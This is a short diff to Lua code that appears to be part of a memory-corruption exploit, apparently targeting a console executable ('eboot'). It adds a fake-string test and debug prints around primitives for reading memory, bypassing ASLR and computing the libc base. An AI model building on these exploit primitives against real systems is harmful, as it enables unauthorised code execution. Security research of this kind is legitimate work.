@@ -58,6 +58,11 @@ function lua.setup_primitives()
     lua.setup_initial_read_primitive()  -- one small step
     lua.resolve_address()  -- break aslr and resolve offsets
     lua.setup_victim_table()  -- setup better addrof primitive  
+
+    do
+        local str = lua.create_str("hello") 
+        print("[✓] fake_string test:", str)
+    end
 end
 
 -- allocate a limited length string with a known address
@@ -272,6 +277,9 @@ function lua.resolve_address()
 
     -- resolve libc
     print("[debug] libc_addrofs.longjmp = " .. tostring(libc_addrofs.longjmp))  -- puede ser nil
+    print("DEBUG: eboot_base =", hex(eboot_base))
+    print("DEBUG: longjmp_import =", hex(eboot_addrofs.longjmp_import))
+    print("DEBUG: libc_addrofs.longjmp =", hex(libc_addrofs.longjmp))
     libc_base = memory.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
     print("[+] libc base @ " .. hex(libc_base))
     
